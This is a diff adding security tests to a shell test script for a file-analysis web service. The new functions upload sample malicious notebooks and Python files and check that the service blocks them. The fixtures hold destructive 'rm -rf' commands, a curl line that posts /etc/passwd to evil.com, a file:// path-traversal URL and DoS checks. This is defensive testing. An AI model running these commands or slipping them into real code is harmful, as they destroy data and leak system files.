@@ -195,6 +195,259 @@ test_security_headers() {
     fi
 }
 
+test_security_sandbox() {
+    echo "🛡️ Testing security sandbox file upload protection..."
+    
+    # Test 1: Malicious notebook with subprocess calls
+    cat > "$TEMP_DIR/malicious.ipynb" << 'EOF'
+{
+  "cells": [
+    {
+      "cell_type": "code",
+      "source": [
+        "import subprocess\n",
+        "subprocess.call([\"rm\", \"-rf\", \"/tmp\"])"
+      ]
+    }
+  ],
+  "metadata": {},
+  "nbformat": 4,
+  "nbformat_minor": 4
+}
+EOF
+    
+    local response_file="$TEMP_DIR/sandbox_response"
+    local http_code=$(curl -s -m 10 -o "$response_file" -w "%{http_code}" \
+        -F "file=@$TEMP_DIR/malicious.ipynb" \
+        "$BASE_URL/api/analyze" 2>/dev/null)
+    
+    if [ "$http_code" = "400" ]; then
+        local response_content=$(cat "$response_file" 2>/dev/null)
+        if echo "$response_content" | grep -qi "security\|blocked\|dangerous"; then
+            log_result "Security Sandbox - Subprocess Block" "true" "Malicious subprocess call blocked"
+        else
+            log_result "Security Sandbox - Subprocess Block" "false" "Unexpected error response: $response_content"
+        fi
+    else
+        log_result "Security Sandbox - Subprocess Block" "false" "HTTP $http_code - Should have been blocked"
+    fi
+    
+    # Test 2: Malicious notebook with eval() calls
+    cat > "$TEMP_DIR/eval_malicious.ipynb" << 'EOF'
+{
+  "cells": [
+    {
+      "cell_type": "code",
+      "source": [
+        "eval(\"import os; os.system('rm -rf /')\")"
+      ]
+    }
+  ],
+  "metadata": {},
+  "nbformat": 4,
+  "nbformat_minor": 4
+}
+EOF
+    
+    http_code=$(curl -s -m 10 -o "$response_file" -w "%{http_code}" \
+        -F "file=@$TEMP_DIR/eval_malicious.ipynb" \
+        "$BASE_URL/api/analyze" 2>/dev/null)
+    
+    if [ "$http_code" = "400" ]; then
+        local response_content=$(cat "$response_file" 2>/dev/null)
+        if echo "$response_content" | grep -qi "security\|blocked\|dangerous"; then
+            log_result "Security Sandbox - Eval Block" "true" "Malicious eval call blocked"
+        else
+            log_result "Security Sandbox - Eval Block" "false" "Unexpected error response: $response_content"
+        fi
+    else
+        log_result "Security Sandbox - Eval Block" "false" "HTTP $http_code - Should have been blocked"
+    fi
+    
+    # Test 3: Malicious Python file with os.system
+    local malicious_python='import os
+os.system("curl -X POST http://evil.com/steal -d @/etc/passwd")'
+    echo "$malicious_python" > "$TEMP_DIR/malicious.py"
+    
+    http_code=$(curl -s -m 10 -o "$response_file" -w "%{http_code}" \
+        -F "file=@$TEMP_DIR/malicious.py" \
+        "$BASE_URL/api/analyze" 2>/dev/null)
+    
+    if [ "$http_code" = "400" ]; then
+        local response_content=$(cat "$response_file" 2>/dev/null)
+        if echo "$response_content" | grep -qi "security\|blocked\|dangerous"; then
+            log_result "Security Sandbox - OS System Block" "true" "Malicious os.system call blocked"
+        else
+            log_result "Security Sandbox - OS System Block" "false" "Unexpected error response: $response_content"
+        fi
+    else
+        log_result "Security Sandbox - OS System Block" "false" "HTTP $http_code - Should have been blocked"
+    fi
+    
+    # Test 4: File with shell injection patterns
+    cat > "$TEMP_DIR/shell_injection.ipynb" << 'EOF'
+{
+  "cells": [
+    {
+      "cell_type": "code",
+      "source": [
+        "!rm -rf /tmp/*"
+      ]
+    }
+  ],
+  "metadata": {},
+  "nbformat": 4,
+  "nbformat_minor": 4
+}
+EOF
+    
+    http_code=$(curl -s -m 10 -o "$response_file" -w "%{http_code}" \
+        -F "file=@$TEMP_DIR/shell_injection.ipynb" \
+        "$BASE_URL/api/analyze" 2>/dev/null)
+    
+    if [ "$http_code" = "400" ]; then
+        local response_content=$(cat "$response_file" 2>/dev/null)
+        if echo "$response_content" | grep -qi "security\|blocked\|dangerous"; then
+            log_result "Security Sandbox - Shell Injection Block" "true" "Shell injection pattern blocked"
+        else
+            log_result "Security Sandbox - Shell Injection Block" "false" "Unexpected error response: $response_content"
+        fi
+    else
+        log_result "Security Sandbox - Shell Injection Block" "false" "HTTP $http_code - Should have been blocked"
+    fi
+    
+    # Test 5: Test that legitimate files still work
+    cat > "$TEMP_DIR/legitimate.ipynb" << 'EOF'
+{
+  "cells": [
+    {
+      "cell_type": "code",
+      "source": [
+        "import torch",
+        "model = torch.nn.Linear(10, 1)",
+        "print('Hello World')"
+      ]
+    }
+  ],
+  "metadata": {},
+  "nbformat": 4,
+  "nbformat_minor": 4
+}
+EOF
+    
+          http_code=$(curl -s -m 30 -o "$response_file" -w "%{http_code}" \
+          -F "file=@$TEMP_DIR/legitimate.ipynb" \
+          "$BASE_URL/api/analyze" 2>/dev/null)
+    
+    if [ "$http_code" = "200" ]; then
+        local response_content=$(cat "$response_file" 2>/dev/null)
+        if echo "$response_content" | grep -qi "success.*true\|analysis"; then
+            log_result "Security Sandbox - Legitimate File" "true" "Legitimate notebook processed successfully"
+        else
+            log_result "Security Sandbox - Legitimate File" "false" "Unexpected response: $response_content"
+        fi
+    else
+        log_result "Security Sandbox - Legitimate File" "false" "HTTP $http_code - Legitimate file should work"
+    fi
+}
+
+test_file_type_validation() {
+    echo "📁 Testing file type validation..."
+    
+    # Test 1: Non-Python/non-notebook file rejection
+    echo "This is not a Python or notebook file" > "$TEMP_DIR/malicious.txt"
+    
+    local response_file="$TEMP_DIR/filetype_response"
+    local http_code=$(curl -s -m 10 -o "$response_file" -w "%{http_code}" \
+        -F "file=@$TEMP_DIR/malicious.txt" \
+        "$BASE_URL/api/analyze" 2>/dev/null)
+    
+    if [ "$http_code" = "400" ]; then
+        local response_content=$(cat "$response_file" 2>/dev/null)
+        if echo "$response_content" | grep -qi "invalid.*file.*type"; then
+            log_result "File Type Validation - TXT Rejection" "true" "Non-Python/notebook files rejected"
+        else
+            log_result "File Type Validation - TXT Rejection" "false" "Unexpected error: $response_content"
+        fi
+    else
+        log_result "File Type Validation - TXT Rejection" "false" "HTTP $http_code - Should reject .txt files"
+    fi
+    
+    # Test 2: Binary file with .py extension
+    echo -e "\x89\x50\x4E\x47\x0D\x0A\x1A\x0A" > "$TEMP_DIR/fake.py"  # PNG header
+    
+    http_code=$(curl -s -m 10 -o "$response_file" -w "%{http_code}" \
+        -F "file=@$TEMP_DIR/fake.py" \
+        "$BASE_URL/api/analyze" 2>/dev/null)
+    
+    if [ "$http_code" = "400" ]; then
+        local response_content=$(cat "$response_file" 2>/dev/null)
+        if echo "$response_content" | grep -qi "encoding\|utf-8"; then
+            log_result "File Type Validation - Binary Rejection" "true" "Binary files with Python extension rejected"
+        else
+            log_result "File Type Validation - Binary Rejection" "false" "Unexpected error: $response_content"
+        fi
+    else
+        log_result "File Type Validation - Binary Rejection" "false" "HTTP $http_code - Should reject binary files"
+    fi
+}
+
+test_path_traversal_protection() {
+    echo "🔍 Testing path traversal protection..."
+    
+    # Test URL parameter injection
+    local response_file="$TEMP_DIR/traversal_response"
+    local malicious_url="file://../../../etc/passwd"
+    
+    local http_code=$(curl -s -m 10 -o "$response_file" -w "%{http_code}" \
+        -d "url=$malicious_url" \
+        "$BASE_URL/api/analyze" 2>/dev/null)
+    
+    if [ "$http_code" = "400" ] || [ "$http_code" = "500" ]; then
+        local response_content=$(cat "$response_file" 2>/dev/null)
+        if ! echo "$response_content" | grep -qi "root:"; then
+            log_result "Path Traversal Protection" "true" "Local file access blocked"
+        else
+            log_result "Path Traversal Protection" "false" "CRITICAL: Local file access possible!"
+        fi
+    else
+        log_result "Path Traversal Protection" "false" "HTTP $http_code - Should block file:// URLs"
+    fi
+}
+
+test_dos_protection() {
+    echo "⚡ Testing DoS protection..."
+    
+    # Test 1: Large file upload
+    dd if=/dev/zero of="$TEMP_DIR/large.ipynb" bs=1M count=10 2>/dev/null
+    
+    local response_file="$TEMP_DIR/dos_response"
+    local http_code=$(timeout 10 curl -s -m 10 -o "$response_file" -w "%{http_code}" \
+        -F "file=@$TEMP_DIR/large.ipynb" \
+        "$BASE_URL/api/analyze" 2>/dev/null)
+    
+    if [ "$http_code" = "400" ] || [ "$http_code" = "413" ] || [ "$http_code" = "500" ]; then
+        log_result "DoS Protection - Large File" "true" "Large file uploads rejected/handled (HTTP $http_code)"
+    else
+        log_result "DoS Protection - Large File" "false" "HTTP $http_code - Large files should be limited"
+    fi
+    
+    # Test 2: Rapid requests (simple rate limiting test)
+    local success_count=0
+    for i in {1..5}; do
+        local quick_response=$(curl -s -m 2 -w "%{http_code}" -o /dev/null "$BASE_URL/" 2>/dev/null)
+        if [ "$quick_response" = "200" ]; then
+            ((success_count++))
+        fi
+    done
+    
+    if [ "$success_count" -gt 0 ] && [ "$success_count" -le 5 ]; then
+        log_result "DoS Protection - Rate Limiting" "true" "Rapid requests handled ($success_count/5 successful)"
+    else
+        log_result "DoS Protection - Rate Limiting" "false" "Unexpected behavior: $success_count/5 requests successful"
+    fi
+}
+
 test_mcp_tools_list() {
     local payload='{"jsonrpc":"2.0","id":1,"method":"tools/list","params":{}}'
     local response_file="$TEMP_DIR/mcp_tools_response"
@@ -575,6 +828,10 @@ run_tests() {
     
     # Security tests (always run - critical for production)
     test_security_headers
+    test_security_sandbox
+    test_file_type_validation
+    test_path_traversal_protection
+    test_dos_protection
     
     # MCP tests (always run)
     test_mcp_tools_list
